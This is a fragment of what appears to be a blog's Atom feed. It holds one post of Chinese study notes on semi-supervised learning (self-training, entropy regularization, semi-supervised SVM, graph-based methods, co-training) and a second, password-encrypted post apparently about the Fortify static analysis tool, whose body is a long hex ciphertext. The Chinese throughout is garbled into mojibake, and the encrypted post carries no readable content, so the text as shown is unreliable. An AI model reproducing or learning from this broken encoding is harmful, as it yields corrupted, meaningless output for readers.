href="#Semi-supervised-Generative-Model-ç”Ÿæˆå¼æ–¹æ³•" class="headerlink" title="Semi-supervised Generative Model(ç”Ÿæˆå¼æ–¹æ³•)"></a>Semi-supervised Generative Model(ç”Ÿæˆå¼æ–¹æ³•)</h1><p>å…ˆç»™å‡ºåˆå§‹å€¼ï¼Œæ¥ç€è®¡ç®—æ— æ ‡è®°æ•°æ®çš„$p\theta(C_1|x^u)$ï¼Œå†æ›´æ–°æ¨¡å‹çš„$P(C_1)$å’Œ$\mu$ï¼Œåå¤è¿­ä»£ç›´åˆ°ç®—æ³•æ”¶æ•›</p><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/image-20191024110951281.png" alt="image-20191024110951281"></p><h1 id="Self-training"><a href="#Self-training" class="headerlink" title="Self-training"></a>Self-training</h1><ol><li>ç”¨æ ‡è®°æ•°æ®ç”Ÿæˆæ¨¡å‹</li><li>ç”¨æ¨¡å‹é¢„æµ‹æœªæ ‡è®°æ•°æ®</li><li>å°†éƒ¨åˆ†é¢„æµ‹çš„æ ‡è®°æ•°æ®ä»æœªæ ‡è®°æ•°æ®ä¸­ç§»åˆ°å·²æ ‡è®°æ•°æ®ä¸­ï¼Œå†å›åˆ°ç¬¬ä¸€æ­¥ï¼Œè¿™é‡Œç§»åŠ¨çš„ç­–ç•¥éœ€è¦è‡ªå·±å†³å®š</li></ol><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/image-20191024111124407.png" alt="image-20191024111124407"></p><h1 id="Generative-Model-amp-Self-training"><a href="#Generative-Model-amp-Self-training" class="headerlink" title="Generative Model &amp; Self-training"></a>Generative Model &amp; Self-training</h1><p>Generative Modelå¯¹æœªæ ‡è®°æ•°æ®å±äºå“ªä¸€ç±»ä¸æ˜¯ç¡®å®šçš„ï¼Œè€Œæ˜¯ä¸€ä¸ªå¯èƒ½æ€§ï¼Œè€ŒSelf-trainingå¯¹ä¸æœªæ ‡è®°æ•°æ®ä¼šç»™å‡ºå±äºå“ªä¸€ç±»ï¼Œéé»‘å³ç™½ã€‚</p><p>å¯¹äºç¥ç»ç½‘ç»œæ¥è¯´ï¼ŒGenerative Modelä¸é€‚ç”¨</p><p>å¯¹äºç›´æ¨å­¦ä¹ æ¥è¯´ï¼ŒSelf-traingingä¸é€‚ç”¨ï¼ˆå› ä¸ºæœªæ ‡è®°çš„æ•°æ®æœ¬èº«å°±æ˜¯éœ€è¦é¢„æµ‹çš„ï¼Œç¬¬ä¸€æ¬¡å·²ç»èƒ½ç»™å‡ºç»“æœï¼‰</p><h1 id="Entropy-based-Regularization"><a href="#Entropy-based-Regularization" class="headerlink" title="Entropy-based Regularization"></a>Entropy-based Regularization</h1><p>Self-trainingçš„ä¼˜åŒ–ç‰ˆï¼Œä½¿å…¶é€‚ç”¨äºç¥ç»ç½‘ç»œï¼Œå…¶æ€æƒ³æ˜¯è®¤ä¸ºï¼Œå¦‚æœ$y^u$çš„åˆ†å¸ƒè¾ƒä¸ºé›†ä¸­ï¼Œé‚£ä¹ˆåˆ†ç±»æ•ˆæœæ¯”è¾ƒå¥½ï¼Œè€Œè‹¥$y^u$åˆ†å¸ƒä¸é›†ä¸­ï¼Œåˆ™ç¥ç»ç½‘ç»œæ•ˆæœè¾ƒå·®ï¼Œå› æ­¤å†æŸå¤±å‡½æ•°æ€»å¢åŠ Eçš„åº¦é‡ï¼ŒEä¸ºEntropyï¼Œè¡¨ç¤ºäº†åˆ†å¸ƒæ˜¯å¦é›†ä¸­ </p><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/1571835087936.png" alt="1571835087936"></p><h1 id="Semi-supervised-SVM"><a href="#Semi-supervised-SVM" class="headerlink" title="Semi-supervised SVM"></a>Semi-supervised SVM</h1><p>æšä¸¾æœªæ ‡è®°çš„æ‰€æœ‰å¯èƒ½æ€§ï¼Œæœ€å¤§åŒ–marginå’Œleast error</p><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/image-20191024121420642.png" alt="image-20191024121420642"></p><h1 id="Smoothness-Assumption"><a href="#Smoothness-Assumption" class="headerlink" title="Smoothness Assumption"></a>Smoothness Assumption</h1><p>å‡è®¾ï¼šå¦‚æœ$x_1$å’Œ$x_2$ç›¸ä¼¼ï¼Œé‚£ä¹ˆ$y_1$å¯èƒ½ç­‰äº$y_2$ï¼Œæ›´å‡†ç¡®çš„è¯´ï¼Œ$x_1$å’Œ$x_2$åœ¨åŒä¸€é«˜å¯†åº¦çš„åŒºåŸŸçš„åŒºåŸŸä¸Šï¼Œé‚£ä¹ˆå®ƒä»¬å¯èƒ½ä¸€è‡´ï¼ˆæ„Ÿè§‰å¾ˆåƒåŸºäºå¯†åº¦çš„èšç±»ç®—æ³•ï¼‰</p><p>åˆç”±äºæœªæ ‡è®°æ ·æœ¬çš„ç‰¹å¾å¯ä»¥å¡«å……å¯†åº¦ï¼Œç†è®ºä¸Šæ˜¯æœ‰æ•ˆçš„ã€‚</p><p>å› æ­¤å…·ä½“åšæ³•ï¼šå…ˆèšç±»ï¼Œç„¶åå†Label</p><h2 id="Graph-based-Approach"><a href="#Graph-based-Approach" class="headerlink" title="Graph-based Approach"></a>Graph-based Approach</h2><p>å°†$x$è§†ä¸ºç‚¹ï¼Œåœ¨ç‚¹ä¹‹é—´è¿è¾¹ï¼Œæ„æˆå›¾ï¼Œå¦‚æœä¸¤ç‚¹ä¹‹é—´å¯è¾¾ï¼Œé‚£ä¹ˆè®¤ä¸ºä¸¤æ¡æ•°æ®æ˜¯ç›¸ä¼¼çš„ã€‚å¦‚ä¸‹å¦‚ï¼Œæ–¹å—å’Œä¸‰è§’è™½ç„¶è·ç¦»å¾ˆè¿‘ï¼Œä½†æ˜¯ç”±äºå®ƒä»¬ä¸å¯è¾¾ï¼Œå› æ­¤å®ƒä»¬ä¸ç›¸ä¼¼</p><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/1571836705037.png" alt="1571836705037"></p><p>æœ‰äº›æ—¶å€™ï¼Œè¿™äº›è¾¹æ˜¯ç°æˆå°±æœ‰çš„ï¼Œæ¯”å¦‚è¯´è®ºæ–‡ä¹‹é—´çš„äº’ç›¸å¼•ç”¨ï¼Œç½‘é¡µé—´çš„è¶…é“¾æ¥ã€‚</p><p>æœ‰äº›æƒ…å†µä¸‹æ˜¯æ²¡æœ‰çš„ï¼Œåªèƒ½é€šè¿‡ä¸€äº›ç»éªŒæ¥æ„é€ è¾¹ï¼Œæ¯”å¦‚ä½¿ç”¨kè¿‘é‚»ï¼Œe-è¿‘é‚»ï¼ˆæ¨èï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè·ç¦»æ¨èä½¿ç”¨Gaussian Radial Basisï¼Œåªæœ‰é è¿‘çš„ç‚¹æ‰ä¼šç¬¦åˆè¦æ±‚</p><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/1571837008739.png" alt="1571837008739"></p><p>è¯¥æ–¹æ³•çš„ä¼˜åŠ¿åœ¨äºèµ‹äºˆäº†æ ‡è®°æ•°æ®â€œä¼ æŸ“æ€§â€ï¼Œå…¶å¯ä»¥å»¶è¾¹ä¼ æ’­åˆ°æ‰€æœ‰ç±»æˆå‘˜ã€‚åŠ£åŠ¿åœ¨äºæœªæ ‡è®°æ•°æ®è¦è¶³å¤Ÿå¤šï¼Œå¦åˆ™æ— æ³•ä¼ é€’ã€‚</p><p>å®šé‡åˆ†æsmoothnessï¼š</p><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/image-20191024115845979.png" alt="image-20191024115845979"></p><p>å¦å¤–$S$å¯ä»¥é€šè¿‡çŸ©é˜µè¿ç®—å¾—åˆ°ï¼Œå³è®¡ç®—L, Wä¸ºå›¾çš„é‚»æ¥çŸ©é˜µï¼ŒDçš„å¯¹è§’çº¿ä¸Šçš„å€¼ä¸ºæ¯è¡Œçš„å’Œ</p><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/image-20191024120650988.png" alt="image-20191024120650988"></p><p>åœ¨ç¥ç»ç½‘ç»œä¼ æ’­æ—¶ï¼Œå°†Sä¹˜ä¸Šæƒé‡$\lambda$åŠ åˆ°æŸå¤±å‡½æ•°ä¸Šï¼š</p><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/image-20191024121139659.png" alt="image-20191024121139659"></p><h1 id="Disagreement-based-methodï¼ˆåŸºäºåˆ†æ­§çš„æ–¹æ³•ï¼‰"><a href="#Disagreement-based-methodï¼ˆåŸºäºåˆ†æ­§çš„æ–¹æ³•ï¼‰" class="headerlink" title="Disagreement-based methodï¼ˆåŸºäºåˆ†æ­§çš„æ–¹æ³•ï¼‰"></a>Disagreement-based methodï¼ˆåŸºäºåˆ†æ­§çš„æ–¹æ³•ï¼‰</h1><p>é¦–å…ˆæå‡ºå¤šè§†å›¾çš„æ¦‚å¿µï¼Œå³ä¸€ä¸ªæ•°æ®å¯¹è±¡åœ¨å¤šä¸ªæ–¹é¢å­˜åœ¨å¤šä¸ªæ•°æ®é›†ï¼Œæ¯”å¦‚ç”µå½±ï¼Œå°±å­˜åœ¨å›¾åƒç”»é¢çš„æ•°æ®é›†å’Œå£°éŸ³çš„æ•°æ®é›†ï¼ˆä¸¤ä¸ªè§†å›¾ï¼‰ï¼Œå› æ­¤å¯¹äºå¤šä¸ªæ–¹é¢ï¼ˆè§†å›¾ï¼‰å»ºç«‹å¤šä¸ªæ¨¡å‹ã€‚</p><p>å¤šä¸ªæ¨¡å‹é—´å¯ä»¥å±•å¼€ååŒè®­ç»ƒï¼Œå³å…ˆåœ¨æ¯ä¸ªè§†å›¾ä¸Šï¼Œä½¿ç”¨å·²æ ‡è®°çš„æ•°æ®è®­ç»ƒå‡ºåˆ†ç±»å™¨ï¼Œè®©æ¯ä¸€ä¸ªåˆ†ç±»å™¨æ ‡è®°æœªæ ‡è®°çš„æ•°æ®ï¼Œé€‰æ‹©æœ€æœ‰æŠŠæ¡çš„æœªæ ‡è®°æ ·æœ¬èµ‹äºˆä¼ªæ ‡è®°æ”¾å…¥è®­ç»ƒé›†ï¼Œå†å°†æ–°çš„è®­ç»ƒé›†ç»™å¦ä¸€è§†å›¾ä¸Šçš„åˆ†ç±»å™¨è®­ç»ƒï¼Œç›´åˆ°åˆ†ç±»å™¨ç»“æœä¸å†å˜åŒ–ã€‚</p><p>è¯¥æ–¹æ³•ç»è¿‡æ”¹é€ ï¼Œå¯ä»¥ç”¨äºå•è§†å›¾ï¼Œä»…éœ€ä¸åŒåˆ†ç±»å™¨å°±å¯æå‡æ•ˆæœã€‚</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ul><li><p>Machine Learning (Hung-yi Lee, NTU) ï¼Œ <a href="https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49" target="_blank" rel="noopener">https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49</a> ï¼ˆå›¾ç‰‡æ¥æºï¼Œæè€å¸ˆè®²çš„è¯¾çœŸçš„å¾ˆå¥½ï¼Œå¤§å®¶å¯ä»¥å¬å¬çœ‹ï¼‰</p></li><li><p>å‘¨å¿—å. æœºå™¨å­¦ä¹ [M]. æ¸…åå¤§å­¦å‡ºç‰ˆç¤¾, 2016. </p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;åŸºæœ¬ä»‹ç»&quot;&gt;&lt;a href=&quot;#åŸºæœ¬ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;åŸºæœ¬ä»‹ç»&quot;&gt;&lt;/a&gt;åŸºæœ¬ä»‹ç»&lt;/h1&gt;&lt;p&gt;åŠç›‘ç£ï¼ˆSemi-supervised Learningï¼‰å³è¾“å…¥å°éƒ¨åˆ†å·²æ ‡è®°æ•°æ®å’Œå¤§éƒ¨åˆ†æœªæ ‡è®°æ•°æ®è¿›è¡Œå­¦ä¹ ï¼Œä»¥æå‡å‡†ç¡®ç‡çš„ä¸€ç±»æœºå™¨å­¦ä¹ æ–¹æ³•ã€‚&lt;/p&gt;&lt;p&gt;æœ‰ä¸¤ç§ç”¨æ³•ï¼š&lt;/p&gt;&lt;ul&gt;
&lt;li&gt;Transductive learningï¼šæ— æ ‡è®°æ•°æ®å°±æ˜¯æµ‹è¯•é›†æœ¬èº«&lt;/li&gt;
&lt;li&gt;Inductive learningï¼šæ— æ ‡è®°æ•°æ®ä¸æ˜¯æµ‹è¯•é›† &lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="æœºå™¨å­¦ä¹ " scheme="http://anemone.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="æœºå™¨å­¦ä¹ " scheme="http://anemone.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="åŠç›‘ç£" scheme="http://anemone.top/tags/%E5%8D%8A%E7%9B%91%E7%9D%A3/"/>
    
  </entry>
  
  <entry>
    <title>Fortifyä½¿ç”¨åˆæ¢</title>
    <link href="http://anemone.top/whitebox-Fortify%E4%BD%BF%E7%94%A8%E5%88%9D%E6%8E%A2/"/>
    <id>http://anemone.top/whitebox-Fortifyä½¿ç”¨åˆæ¢/</id>
    <published>2019-10-23T01:27:49.000Z</published>
    <updated>2019-11-03T13:22:18.427Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰, è¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹, è¯·å†è¯•è¯•." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">è¾“å…¥å¯†ç ï¼ŒæŸ¥çœ‹æ–‡ç« </label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="3946db7e573043518daa8f82f90c988c2c1035018074993beac17007b598d0ba">24cf14f4c89eafae7f6aaf5c3fd0468f66f766e30cbff21d883f6babf33f9f1899ce479d339500dd34001d6cee5f66baf25939a44680530e72967798b6d170f0860eb651aa175d850bc0252ce840dce1082a56fd55371edb5723339365ba85dc252af5d208f1c72bbe88d10f819137034f0e0334a7627a1ab4bc9e742d12bc24c2ef5c347dd91df4c0a3ae41faf911eb79a1d5cd5d5fcc0a35793ae220a23c658f79d47d30be438e95b3fe5c317c5c0bfdc1743a9d3861c3bc94f9bb6caadaedd43d3215fbd4ba3c6e556610dd33834acd38034981fd141c7dcbec28cf90b72de1a621dd3918341380994b25b3d16b7b20c698c408950f2afe47529dc4fb8bfd381ab6c670f3da985841153ef1fa781716bc5a78ca5965b2ebf8d448072fba53be10fbaf92e10148a6c2caba9d18e370eb65acfb4e39ba946c7e52a0938fc31a357776b98f72a303f9ffaa796944ce6fcc1d789eff50d2d857737b4b96a5832634a26afaf13b7c3595dcf83380e49b4d38f44ceaff5a48af492cb351a132b8f773b6040fc7b6a76d94cf9320a189e3667c68e902ab83a43670c6d1c6c100ad0789083ec7c6db930990e2599bb6c17df5ab52d1f3a2dbe5f71556471ab1f4f6bfa660d4b48ef7e22d69fce901fc77346f7131305894f60f9f13dd4c94315c1469f24ba71c09d58634189121db6b5d08b362b6b54989e22e53180aa26a1398d6b2990bb10d430f6ee910ef61543c3e1f57e215bf6b0819b6fdc6b28b1ac1e877d85dc9c5300bf3d5e0cb8be55bbfbeba6015955ef7f227bf8dace7eef01c597bc68becb96356c9328c43dd5a45df7a7c3b5b806b8c359956c91d60ca99f3c7039c757a4ce1899862c2f56a944d3991c786e962c7f5d2e7c30db551953f03bae3c7ee7519eb4a7388c8df1d000a444de31cac028cb611ff9bec5b1aa71a0e3d9cca265d81f017f00024d85a8d40dcd55140212049201d306dbe3dfbfa25c1ca926c054fe319b8dc9ae90ec069a44a14cd759a9f76d0218c309f06bfb4c100d00e9cf6f271bae91437e72b6ebe58d6392f0bba298e04e221131f4264c53403c65c1cd3030ab19f93a26856503e35f3920ec5102f107b6e0c21b4421566a5be0df719bcc3bd7879cde08f5326c348b9791388116c2a689f8468a6699e9ffb41522a66a325cfe4e74b3b079aa198ba429f211be9603e20352887857db25c97d431ecfb29f746beee2e9c308f98267f677a969715b6838d20b25580edf7bc58898e3d86e0c4d7c7a3882de056d42b97727ff24a04e8b18a171c26b9fe45aa7a95f4ea91e248b9c298ae89640e6ac660111554c8a7350391d6c41f9caddeca5fc43e31821eb879fceaedb734dcee4bccbbbe136464aa9ae410c2c32733b2a300c1d767850d435607cbff1e85af669d4e7d59dbd6f248dee66c267f48f20c0caa7b4c0ca2827a4297c38c9c34b5099e95b36a3f82d2a55b106a191666d5b1f3e180fd6ae6f0effb22611bf0cd07b6bbb020b4a6cc2e8ac5922a22bad8b66bc0478bef74304dae28a7f7afedb18c7ab1a74299c635c179644c466ff297a3df14d53da0c526e46a98ed77f1bff5b4118aa1934fd75d410cdd11c7a934062bcd3b052fd710238eea2de7b5370e9e9c205fb617a622d8ba24de6b40864c7f4505df5bc6ba4be99ae375690a28aef762e73c20b4d68b1068cd0a54f7c3544334b035ea897fd2096c9afc3d76f279a548be30966848ea3c32323a3db745be09b5a233fc722e7b1b9d806b130444f234926300cba2cee96b3b380d30680d831985d0ba832bb59f05ac81e742bd05cc8d39582bee7e832a39fac31042827f0094cdc1896ca2af153a069b53a8b1a47f1b77ee116338b1e51e8d1bf84f7c5175dc6a181cac87f903eec88dcf28a80f4cbc94c6bae8ba7a312879c4eba4143e827f8058c7e75a03204b68d65f9c92dd5b30accbd7a901e11270a3babfa52d5c8a0255c8854af246445e8e3c85f22aa6e438112258ab3f45cb84c2fe46cc886282b8f708e96b4719228aa50487abfcd522ffe7b496b09ccb0a3e01f8ee73abe13d32334ef9c0ca8e6adaeffa82d0ba268a7a770d87daf60d9978f1e2a97c0cc29298e06ce330d8a491edaac97e48e7fd0051516c14866c5ec7f366ebf627c6cdbd942bf4894c9bfe8f22bc7147a841ca4db79d914125a001f58e3ada7f051f6a03ee519c07745b90547b73706ed250d34fb1be5198171092995f184f19ccf613e6ab5ad5fece02c4605ba5be4925336f4091426d24f6e91eac0e5f30a93fddc03d77e0702a93a78b31c921773b77b03552b3e03bbfec679b73707a024f172217a2a22ef1cd4dc85ec838b630fb1d0ee15e1049f73ce204e250e1bbd868c0c4438c538fe84cb644126eccdb568f48f8c0cdf2639179eda54d49cd2269e400d074cb366f342d97997407d48c9f70a6712f09544872da9380ec6e7e6f0d519e01f4a43656c57f810cb4a5264251522d12c3b29d64cc3de3fab712d33708a2a60e1a9cde4e4954299a32395c0d9c70a15e59d9ac8402370f25d9ef84cb1279ea7c892a1a63b0f0d6fccc4bc9e9727119c766e19774c1a5673738700cb8c3066c89a1b00841b405ab169927589f46419fca814873142052cbfc7271f4d2ede45bc0f5cd3546678015c8565b4dcdb0021c82feaf5eddf472a376626671fe8200956c80451feda04dedb4b6cfbe498a308e1e532164334befcefeb4120a6f750f86c179069b1ebde22c713a2d09b193213609bf8d3b22e38940672f6eb180163d93da28339533fce7da156691a19dac67a6ed7e29d7a2b93552fd5b49adb456716e74e1ab957f5ebd87d6bd0b143b5bf4cf547816207024bad172d3f0f8200f937f5d09f10952aa1f431d3bca2743762cb9fd2921fdd707faf3c61317627999ef17ef2d868d88c7a77b884e52e836e1211228fe9a317bd21736b3c5b548b7ae20dbb3dffd078bd2c47b2a2764d8ec9458640fcc343b70f739a626f5554ef5cfca5cc625bb3ab4135d8fc9ddbeb941c93019f142af83f182c059b941274b58247d90519308653c95f96b76cedf99ccb8fe80851cc314d685276536a4e63a53c714d2a9215db81bf72bab579414b70470e3527d2e91d6a950ef52de87c31c42b470d2d561f80b12f6d01b044ef617f3d5b04e31f594f355f3342cfcf889f6257143ecca73c28053989b868e8ebe21057334ee7a4f744c375ac08ba0d1db5a0471dcafdd3d2ac38413147d2ab5711a03ac60efa6504d59ba6e59405ad832d82b9745b320ce6ea0f92d0d6e6db492fcd6f3c25d0ef95824c640c68967b307c86c9429b83fd9269be86bc88351cd4a4970212cdd320e130cccde1f60646a748c2594011bc5bb5f61da5891ef57d8af4af737511d8d65879be70058fbaf1c388bb218f5158e02ab7390be6f9f0fb69984e26ec17b6350e6c4879494442e16863da1c7af9c0a15f1a9552e8ed7def293221c44c87a186a9f0f1f172059f14ed8acdd6a17b1ce2c92c292e459125dd6352d328f75408e5d131d90cedcd815ab0669fe67d91bde736452f82557f2b987a835446099cc5b17915ccd19697252be768e6fba702db9738cbbbebb2e0301c33554d2a622c552c5e3d7419a89709dd0809665ab5c6e8a6ca37e1a396ad2cd4a9639ef2a122b733f58bbfb69fc752d1eca70c24caf62f38b8e3f39655d00d3056501453bda3fc05fb8d76e03f2daff8ce3ba562811cf223a21aee5a70b49dc9fd78af157976281a4ee719289845c718b46324f8b64c5f71206774a9cb925ccec33b9d2d5d15a3ea593d66b2794c8099fd3ca6fb49b61703c60cda3ff6e52c8663d5123440f881d0776caaf29a2533a96166aca2dbad6c2d92ce5dcfac04c23f6519c34c8469726b052456cf2be3ed6148edf43860b4e87f9165450c11b752ce694c4b005ac79f5dc1c28d3fcdf41fb3028994215479ae073892a95105e43ee77fb7d68bbe764a85e54b28fae8324415de861b65f2210ee16e050885ece1287051c27092f4cb61fd155200db6131d227f8ced4f3840b4d4e50f488d19fc50d5e72044c1dfe447cf183138a07fd027a270451f5c265b6edb385fc82f3987552eadba18c1be5813a5814e49ce378583fee12c04b7126a12e0931d871a830cb997b6b19e0a8d2dc0bb7b788a9ec445520a3862a2f3800610f73970e9d0c00b3c7c95fd0616a37af29725f21aded01656233336424321023ac4bc312961974344960cc353eb6c55125b79fb36e5de4d642ba8de7e654591ffbb8ae81fe18217155df4af3964b274b3845c12a3c8ea6ad11945c6de7cbd458ca3a46baa3ca1d22c9635c3bdc34bc6077fc8256a9d62b826eb23656ed1d2d1849ef87afa78dd9071655d6fbeecdd8e7e1ce66be77fa4d0a1eb8cc70e56a9c35c3329efac03282a9450486550fcad9083eaec1464595236ead925dee92fb90bb78c9564674c2a099aee21664beb03a3f98732dba1ece3352be762632732c0deb188c9d81eed046bad0b5a10917deb061bd75adb2f3ef0dc566b71c236b8bfcc1ec29143253aad005cf6d0b705116ea45468e1afbd2090ac8bcd7dbc96c0f85d68ab70e1d3913d1ae107584e540421ce4514a61e069cabb04516b4395aa9af3ae6b3ff85979bd7b9c3d9ac9575cef989fe1c3299b0106c82014c9efc90615dc6d6e59cf2bb31edb5dbc956637e062518eab449bfead414e93575ae96d6f9381bb95f802e5c3733b8c9e4b5269554888b0cc91e9b9c4e4d055896a2fd2ca4f3fdeb21deb19493d5c234bef98f7873b6c3730e36adc0e2f8b935c29dbfeb855b08210b4f33383e04006a477479b31c30777e51afe8d05f1f7726e76501cf38eabd454dffe61559e5ff5fa7d496f5de5b044a8c41deccae8e6accd469f5f3079a406867840a056fc81b33bc6c97848e89ed326448585984be0293346e13408388d9fc5577c9639506e6a215256cb7af0e5e3ef1de637723a73ccd08956fb0a9222baea89eae76bff60f909a6e384379dadd09d1ddbdc89523417abc34fb65cc42ceac53165d63508bebc434cc7ac3d9bebd3256335d11c377ea3d2c56a54ecc69551fdfc56402d6dd3573564a1ef3b66d0142833a61629cbaeae657ecb83adb6321f89b8f831e216aa1b8b3c3a441fb03a241e54da8ca39b43247f25e3b0d934c9d61d97097b8f9f859ca87540d426b4ba5f4a6360bdffe8b36478405f9f5f73a1f7dc44e3d815e926b85b6353d81507dbce87d2f0107231ab87add00e0a070d1865749bb83045527d62c2ef7c1f23b04ad4f0b34e96035485530f935d643c61651586544cf0cd1420106b1373b03be09f80659d3f29152a996866997fa62fcb899f2a1fc1b885da864fd60fedfddb72b1f19f0684afa66f37577902d95f9754d77dfcd15c7b60866913c7a8b1652cf6dd3017b754a9fb7fac41991129c574e57949d29e6d9b190acaf2dd53bb34cfa70f4c71147a2935cf1735fb2c319ea2adaef2b3cfb6035ce22320e25871a18b9b7e8c7446113c7c27fb96b04bfd3b514a39edf150ff57a17235468f4e6921c53db1c6f2eaefac245c804af4b507432c7551b9541fad1f0311b0981a3ebc5ea5ec2d207aac99b99c2203d3fef5ee3b0fffd6f01748481e0c445f54fe831f5fc9a4d73e9e867e189fbe74fba280c83a907acf32c8a3b7ebaf86bcf27e07ad976c956f9250bb827a8532a0b68550b13210579cc9042d62112321c692d752e4e4e97265e04829199f9d39431fe99b52f463c7a6c95b9e4b9352a1be92c4316c5f3b69cc215c6a3b3345505b09d387c7d149456151e5c4af2930c73340fadf28754e5cdfc8aa61508ac418e98de5d66a3f3e321fa1995cf28bc7ddf34383878068184608f8f2884867da212620def9f39379b10a7a579610298ad322151f8a631f815f8fb51bbe17f3160c010d7483efb8122426a04345de8c6a970ed78f57ee832222116c7c0d9fa93b239a33e02c4767bb6c1016f929098fa76da9cc16160f6ba94aabd97b5ce095c9d10ba81ebdfc9f49d1c6dde2687c015dd4829ce5a811dccd257c0b50fc29c2289ca8c32afa75359907f178d50c806807f6525e2e86178efb00d76655fb2e55bab6108d45f028efdf0dc59678b5c802e9600326a072ee7d92f2f2d7f90e89be416ff140d267e1fa6af362bc3b2999a8e19c38e404d0ff6b86ae9387b606cc2d8aa6aec01befa7a40cd5c886ee0f62fbc96d3e7db5962c6703abbcb10bb20a472cae495b0f40f6c8c67a81a312454363d18ee4bf5c760514d9f5a24c5ad5e93f4dd2797b8b9cce5cb77ffd4f0b40f0170c59d0e338ea169b78eb80048e918ddc4f45983cd25f0fd7a9bbd1af6057e18ca2f14184167b90bc6aa640ec3cab0e372089b65be245290d665b2aba04be6cdfa60fe1cdcea46e51ec70b3444131aa1373fc16693b29d8cdfc2cd6d5c23af44bed7a224ac6f6dcb60d2c3e4832d4eea1bde7500ff759d42571270f7e0933e59d32b8c019ff8ff732ee83f2b694816bc7a614a4b84a29e9b7f1c6448189b0179dc168104d1964c2bdee5eeb70d8c8beb3a07f358050d1a6dc2fc0e76c395dc8de47593707c4063a9098152684c6bc8efd3ed0b1a8551891515c73af6559b83744422d5b7ba5abb6fed10f891a7a85e4d875cfcc5ca911c38702134d134e6435a69370997cfade2590c30bb9c63994765aa36f5e19b4512b92813f63efea41e1bef4643e9881c0964b7db73f42a4825a10f4eff1918e61a991a08bbbe73ab8fe35da240a168628ec5d70c371db294bbb1aa60e6ef0d3312cea9a1e7195ae2be57c421b28168224591e41ac3e66b12d1edd0ae36a170de03a2d24897ab0a0e5169cb5f96f02af60c366e020c6f1fc4d91595625839eda411f0acdc39a9c6bf223caffa590994775ea2baaf159791d10ce3348229c06481385c06b753a66445e3aa89efaa75d2d804fdb34513480d8b27e20acb5748541dd97df1d5836c00543786a56183437f6a535025ad7e16ba989a5db0c5519a04ffb44d1243f688fbae987815ada509439984d6b29b1ba647c4f395d2a6f4b3af1c8e691059adf1d5eb0abb50efb24017887793469ef32b50a089b3ce9e2629ad55ef9fdb42fa59f0505e350bcd20e1751368f127bd74383cdf2085e43ebce8a0fab1f76e4af0c47d3608c8a03dadb0e1cc934b67cf7f89858248522f20d103035bbb3005e7de615f6b71862772a33375008a5796eedb69e8bc3e96b10ba14ec1b9e470d0eeaee65fc955b772ea8bc7b8ff6d88b0a34dbded5241715b2ec903e394c537bbd7154e0a476b53e84f03d754a2badb7b0bca744e780b07644e7f510fe075b16f5ad96fdc0fcde9fa85587a8d4d3beaf299f511ed9c4977914199a31404d707ad1735ea9c5df52b9493c25a848850368989b183a8ec668fb4e892b1aeee1e434f952b1b1dd7a2a7531662d80b2ac7dccd4f160201ab2fb0fca4b338313380ef5361197dcfbcec7f33ed34e4eeb5336fc77973a159cd809c8012b93665d825cf1c2a7b68b17c00cbbebd8398d54a4b58e6329c81bc6978334abc4b525d0354f20abc1b1eea4a3db90584431a412e3c46e7036587b501d94c1666adaf67277639a1761ab56b7f31e10beff5e0324b2936d444a5177d11cae2837918b9a82284ced0a54f39b3f829c0d8f7525ffa2bc243e0a3afef354ab36e747b757ee8add5ff38bf91b9bbb48aa846921689acae01874a986157a19e2de1d74e43c57148eed078c2adfddc1f8cec70e074e3a579ef22493d2edcf7c01a591826f759cd003d2f063fdb4a796f3b7acdcb8df49938fa9cee8310653f8731c260256c31b6c21fcf371ec3aeab6ef99fb2b1229b9a36b4ce19de67972b1dfbde53d598a8d92187fc6bb6b319b995c814c201b0d8fbbcf9378d948a51f4433037c610eed6c1c1ce24da3c034c8b2dd2f570cfad069acb9a394300fc5bbcefb64e9222f4f7a24bb16a0546b634559e23416d7fd4134ee7dbb6437d5d2fabd6fc1ae6d5b2f7f870ecdf4c33e46c46697a7ffc396c9d67ebd9eb4e6421a3f048e36e6c56984523e44c4bd52296762628e8a630826d0c0996a3cc533a1c4548199adfabf920ff69f3ecacef4c77675b1b77d40647753a590d802e9de6a71bb4d3f34f340489c3c5efbb254951ad234eac7965f7eea4d4f9df83b81b6c91974c47edb53153c193539c42aa77796837a8ccee4af95de0ff431563de7229e246b70ad25ec8a9071962382ae12d7847385a9467e441e00a54c707872d9d9de1a5ed28f87b80bc35c11b072739e6cead52393cfc7061512bbdeab4709d8ae0b88b5b4c6487a40b959d38c09791dae1dcd52cde9c3fa7ee7f14d8ae